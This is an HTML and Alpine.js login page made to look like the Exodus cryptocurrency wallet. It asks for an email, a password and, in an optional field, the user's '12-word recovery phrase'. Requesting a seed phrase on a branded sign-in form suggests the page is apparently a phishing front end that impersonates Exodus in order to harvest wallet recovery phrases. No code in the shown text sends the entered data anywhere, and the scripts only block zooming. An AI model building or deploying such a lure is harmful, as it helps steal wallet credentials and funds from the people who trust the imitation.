<!DOCTYPE html>
<html lang="en" x-data="{ showPassword:false, usePassphrase:false }">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Exodus Login</title>

    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>

    <!-- Alpine.js -->
    <script src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js" defer></script>

    <!-- Font Awesome for icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
            -webkit-touch-callout: none;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
        }
        
        html, body {
            height: 100%;
            width: 100%;
            overflow-x: hidden;
            touch-action: pan-y;
        }
        
        body {
            background: linear-gradient(180deg, #121425 0%, #101126 100%);
            background-attachment: fixed;
            background-repeat: no-repeat;
            background-size: cover;
            min-height: 100vh;
            position: relative;
        }
        
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(180deg, #121425 0%, #101126 100%);
            z-index: -1;
        }
        
        .toggle-password {
            transition: all 0.2s ease;
        }
        
        .toggle-password:hover {
            transform: scale(1.1);
        }
        
        .passphrase-toggle {
            transition: all 0.3s ease;
        }
        
        .passphrase-toggle:hover {
            background-color: rgba(99, 102, 241, 0.1);
        }
        
        .form-input {
            transition: all 0.2s ease;
            border: none !important;
            -webkit-user-select: text;
            -moz-user-select: text;
            -ms-user-select: text;
            user-select: text;
        }
        
        .form-input:focus {
            box-shadow: 0 0 0 2px rgba(99, 102, 241, 0.5);
            outline: none;
        }
        
        .main-container {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            padding: 20px 0;
            width: 100%;
        }
        
        .content-wrapper {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
            width: 100%;
        }
        
        /* Ensure no white edges on mobile */
        @media (max-width: 640px) {
            body {
                background: linear-gradient(180deg, #121425 0%, #101126 100%);
                overflow-x: hidden;
            }
            
            .main-container {
                padding: 0;
            }
            
            .content-wrapper {
                padding: 0 1rem;
            }
        }
        
        /* Disable text selection except for inputs */
        input, textarea {
            -webkit-user-select: text;
            -moz-user-select: text;
            -ms-user-select: text;
            user-select: text;
        }
    </style>
</head>

<body class="text-white">
    <div class="main-container">
        <!-- Header -->
        <header class="absolute top-6 left-6 z-10">
            <button onclick="history.back()" class="text-white text-2xl hover:text-indigo-300 transition-colors">
                <i class="fas fa-arrow-left"></i>
            </button>
        </header>

        <div class="content-wrapper">
            <!-- Logo -->
            <div class="flex justify-center mb-6">
                <div class="text-4xl font-extrabold text-indigo-400">
                    <img src="./exodus-removebg-preview.png" alt="Exodus Logo" width="150px">
                </div>
            </div>

            <!-- Title -->
            <h1 class="text-center text-3xl font-bold mb-2">
                Welcome back!
            </h1>
            
            <p class="text-center text-gray-400 mb-8">
                Sign in to your Exodus account
            </p>

            <!-- Form -->
            <form class="space-y-6 w-full max-w-md mx-auto px-4">

                <!-- Email Field -->
                <div>
                    <label for="email" class="block text-sm font-medium text-gray-300 mb-2">Email Address</label>
                    <input 
                        id="email"
                        type="email" 
                        placeholder="Enter your email address"
                        class="w-full px-4 py-4 rounded-xl bg-[#1A1C33] text-white placeholder-gray-400 focus:outline-none form-input"/>
                </div>

                <!-- Password Field -->
                <div>
                    <label for="password" class="block text-sm font-medium text-gray-300 mb-2">Password</label>
                    <div class="relative">
                        <input 
                            id="password"
                            :type="showPassword ? 'text' : 'password'" 
                            placeholder="Enter your password"
                            class="w-full px-4 py-4 rounded-xl bg-[#1A1C33] text-white placeholder-gray-400 focus:outline-none form-input"/>
                        
                        <button 
                            type="button" 
                            @click="showPassword = !showPassword"
                            class="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 hover:text-white toggle-password">
                            <i :class="showPassword ? 'fas fa-eye-slash' : 'fas fa-eye'"></i>
                        </button>
                    </div>
                </div>

                <!-- Passphrase Option -->
                <div class="flex items-center justify-between">
                    <div class="flex items-center">
                        <button 
                            type="button" 
                            @click="usePassphrase = !usePassphrase"
                            class="flex items-center space-x-2 text-sm text-gray-300 hover:text-indigo-300 passphrase-toggle px-3 py-2 rounded-lg">
                            <i class="fas fa-key text-indigo-400"></i>
                            <span class="text-indigo-400">Use Passphrase</span>
                        </button>
                    </div>
                    
                    <a href="#" class="text-indigo-400 text-sm hover:underline transition-colors">Forgot Password?</a>
                </div>

                <!-- Passphrase Field (Conditional) -->
                <div x-show="usePassphrase" x-transition:enter="transition ease-out duration-300" 
                    x-transition:enter-start="opacity-0 transform -translate-y-2" 
                    x-transition:enter-end="opacity-100 transform translate-y-0">
                    <label for="passphrase" class="block text-sm font-medium text-gray-300 mb-2">Passphrase</label>
                    <div class="relative">
                        <input 
                            id="passphrase"
                            type="text" 
                            placeholder="Enter your passphrase"
                            class="w-full px-4 py-4 rounded-xl bg-[#1A1C33] text-white placeholder-gray-400 focus:outline-none form-input"/>
                        
                        <div class="absolute right-4 top-1/2 -translate-y-1/2 text-indigo-400">
                            <i class="fas fa-key"></i>
                        </div>
                    </div>
                    <p class="text-xs text-gray-400 mt-2">
                        Your passphrase is a 12-word recovery phrase for your Exodus wallet
                    </p>
                </div>

                <!-- Sign In Button -->
                <button 
                    type="submit"
                    class="w-full py-4 bg-indigo-600 rounded-full text-lg font-semibold hover:bg-indigo-700 transition-all duration-300 transform hover:-translate-y-0.5 shadow-lg hover:shadow-indigo-500/25">
                    Sign in
                </button>
            </form>

            <!-- Sign Up -->
            <div class="text-center mt-8">
                <p class="text-gray-400 text-sm">No account?</p>
                <a href="register.html" class="text-indigo-400 font-semibold hover:underline transition-colors">Create an account</a>
            </div>
        </div>

        <!-- Footer -->
        <footer class="text-center py-6 mt-auto">
            <p class="text-gray-500 text-xs">Â© 2025 Exodus. All rights reserved.</p>
        </footer>
    </div>

    <script>
        // Force redraw to ensure gradient covers entire viewport
        document.addEventListener('DOMContentLoaded', function() {
            document.body.style.display = 'none';
            document.body.offsetHeight; // Trigger reflow
            document.body.style.display = 'block';
        });

        // Disable zooming and scaling
        document.addEventListener('touchstart', function(event) {
            if (event.touches.length > 1) {
                event.preventDefault();
            }
        });

        let lastTouchEnd = 0;
        document.addEventListener('touchend', function(event) {
            const now = (new Date()).getTime();
            if (now - lastTouchEnd <= 300) {
                event.preventDefault();
            }
            lastTouchEnd = now;
        }, false);

        document.addEventListener('gesturestart', function(e) {
            e.preventDefault();
        });

        document.addEventListener('gesturechange', function(e) {
            e.preventDefault();
        });

        document.addEventListener('gestureend', function(e) {
            e.preventDefault();
        });

        // Disable double tap to zoom
        document.addEventListener('dblclick', function(e) {
            e.preventDefault();
        }, { passive: false });

        // Prevent pinch zoom
        document.addEventListener('wheel', function(e) {
            if (e.ctrlKey) {
                e.preventDefault();
            }
        }, { passive: false });
    </script>
</body>
</html>
